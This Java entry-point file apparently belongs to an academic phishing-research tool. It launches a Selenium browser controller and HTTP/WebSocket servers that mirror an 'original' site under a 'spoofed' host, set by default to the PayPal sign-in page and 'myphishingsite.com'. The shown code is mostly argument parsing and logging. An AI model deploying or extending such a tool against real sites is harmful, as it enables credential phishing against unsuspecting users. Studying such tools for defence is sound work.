package ch.unibe.scg.phd;

import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.core.appender.ConsoleAppender;
import org.apache.logging.log4j.core.config.Configuration;
import org.apache.logging.log4j.core.config.Configurator;
import org.apache.logging.log4j.core.config.builder.api.AppenderComponentBuilder;
import org.apache.logging.log4j.core.config.builder.api.ConfigurationBuilder;
import org.apache.logging.log4j.core.config.builder.api.ConfigurationBuilderFactory;
import org.apache.logging.log4j.core.config.builder.impl.BuiltConfiguration;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import ch.unibe.scg.phd.communication.ServerHttp;
import ch.unibe.scg.phd.communication.ServerWebSocket;
import ch.unibe.scg.phd.core.BrowserController;
import ch.unibe.scg.phd.io.SeleniumLog;
import ch.unibe.scg.phd.utils.FileUtil;

public class Main {
	private static Logger _LOG;
	private static boolean _FEATURE_DEBUG_OUTPUT = true;
	private static boolean _FEATURE_ENABLE_ADBLOCK = true;
	private static boolean _FEATURE_HEADLESS = false;
//	private static String _PARAM_DEFAULT_BASE_URL = "https://www.softconf.com/utdn/qrs2021-Regular-Paper/";
	private static String _PARAM_ORIGINAL_URL = "https://www.paypal.com/ch/signin";
	private static String _PARAM_SPOOFED_URL = "https://www.myphishingsite.com";
	private static String _PARAM_SPOOFED_HOST;
	private static boolean _FEATURE_HTTPS;
	private static Configuration _configuration;
	

	public static void main(String[] args) {
		//TODO: tab support
		//TODO: multi-user support
		//TODO: webdriver.exe remains running after exit (at least on Windows x64)
		//TODO: browser height bug fix
		//TODO: textbox alignment bug fix
		//TODO: forward / backward key support
		if (args.length == 5) {
			_FEATURE_HEADLESS = Boolean.parseBoolean(args[0]);
			_FEATURE_ENABLE_ADBLOCK = Boolean.parseBoolean(args[1]);
			_FEATURE_DEBUG_OUTPUT = Boolean.parseBoolean(args[2]);
			_PARAM_ORIGINAL_URL = args[3];
			_PARAM_SPOOFED_URL = args[4];
		}
		
		initLogger();
		// Logger must not be initialized before Logger setup is completed.
		// Otherwise, strange configuration inconsistency issues show up.
		 _LOG = LoggerFactory.getLogger(Main.class);
		SeleniumLog.initWorkerThread();		
		
		if (args.length != 5) {
			_LOG.warn("Wrong argument count. Note: URLs must contain a http/https protocol prefix.");
			_LOG.warn("Using default configuration. See examples below.");
			_LOG.warn("java -jar PhD.jar [headless] [adblock] [debug output] [URL of original site] [URL of spoofed site]");
			_LOG.warn("java -jar PhD.jar true true false \"https://www.google.com\" true https://www.myphishingsite.com");
		}
		
		if (!_PARAM_ORIGINAL_URL.contains("/") || !_PARAM_SPOOFED_URL.contains("/")) {
			_LOG.warn("Invalid base URL or host. Note: URLs must contain forward slashes.");
			_LOG.warn("Using default configuration. See examples below.");
			_LOG.warn("java -jar PhD.jar [headless] [adblock] [debug output] [URL of original site] [URL of spoofed site]");
			_LOG.warn("java -jar PhD.jar true true false \"https://www.google.com\" true https://www.myphishingsite.com");
		}
		
		if (_PARAM_SPOOFED_URL.toLowerCase().startsWith("https")) {
			_FEATURE_HTTPS = true;
		} else {
			_FEATURE_HTTPS = false;
		}
		
		if (_PARAM_ORIGINAL_URL.charAt(_PARAM_ORIGINAL_URL.length() - 1) == '/') {
			_PARAM_ORIGINAL_URL = _PARAM_ORIGINAL_URL.substring(0, _PARAM_ORIGINAL_URL.indexOf("/", _PARAM_ORIGINAL_URL.indexOf("//") + 2));
		}
		
		if (_PARAM_SPOOFED_URL.charAt(_PARAM_SPOOFED_URL.length() - 1) == '/') {
			_PARAM_SPOOFED_URL = _PARAM_SPOOFED_URL.substring(0, _PARAM_SPOOFED_URL.indexOf("/", _PARAM_SPOOFED_URL.indexOf("//") + 2));
		}
		
		_PARAM_SPOOFED_HOST = _PARAM_SPOOFED_URL.substring(_PARAM_SPOOFED_URL.indexOf("//") + 2);
		if (_PARAM_SPOOFED_HOST.contains("/")) {
			_PARAM_SPOOFED_HOST = _PARAM_SPOOFED_HOST.substring(0, _PARAM_SPOOFED_HOST.indexOf("/"));
		}
		
		printCurrentConfiguration();
		FileUtil.collectSystemInfo();
		FileUtil.prepareJarTempFolder();
		BrowserController controller = new BrowserController(_PARAM_ORIGINAL_URL, _PARAM_SPOOFED_HOST, _FEATURE_HEADLESS, _FEATURE_ENABLE_ADBLOCK, _FEATURE_DEBUG_OUTPUT, _FEATURE_HTTPS);
		
		ServerHttp.start(_FEATURE_HTTPS);
		ServerWebSocket.start(controller, _FEATURE_HTTPS);
	}
	
	private static void printCurrentConfiguration() {
		StringBuilder featureState = new StringBuilder("[Configuration] ");
		if (_FEATURE_HEADLESS) {
			featureState.append("headless: on, ");
		} else {
			featureState.append("headless: off, ");
		}
		
		if (_FEATURE_ENABLE_ADBLOCK) {
			featureState.append("adblock: on, ");
		} else {
			featureState.append("adblock: off, ");
		}
		
		if (_FEATURE_DEBUG_OUTPUT) {
			featureState.append("debug: on, ");
		} else {
			featureState.append("debug: off, ");
		}
		

		featureState.append("original URL: " + _PARAM_ORIGINAL_URL + ", ");
		
		featureState.append("spoofed URL: " + _PARAM_SPOOFED_URL);
		
		_LOG.warn(featureState.toString());
		
		_LOG.warn("[EXEC] Detected spoofed host: " + _PARAM_SPOOFED_HOST);
		
		if (_FEATURE_HTTPS) {
			_LOG.warn("[EXEC] Using HTTPS since spoofed URL contains HTTPS prefix.");
		} else {
			_LOG.warn("[EXEC] Using HTTP since spoofed URL contains HTTP prefix.");
		} 
	}

	private static void initLogger() {
		ConfigurationBuilder<BuiltConfiguration> builder = ConfigurationBuilderFactory.newConfigurationBuilder();
		builder.setConfigurationName("defaultConfiguration");
		
		Level chosenLevel;
		if (_FEATURE_DEBUG_OUTPUT) {
			chosenLevel = Level.WARN; // was Level.WARN
		} else {
			chosenLevel = Level.ERROR;
		}
		builder.setStatusLevel(chosenLevel);
		
		AppenderComponentBuilder appenderBuilder = builder.newAppender("Stdout", "CONSOLE").addAttribute("target", ConsoleAppender.Target.SYSTEM_OUT);
		appenderBuilder.add(builder.newLayout("PatternLayout").addAttribute("pattern", "%d %-10.10t %-5level %msg%n%throwable"));
		builder.add(appenderBuilder);
		builder.add(builder.newRootLogger(chosenLevel).add(builder.newAppenderRef("Stdout")));
		
		_configuration = builder.build();
		Configurator.initialize(_configuration);
	}
	
}
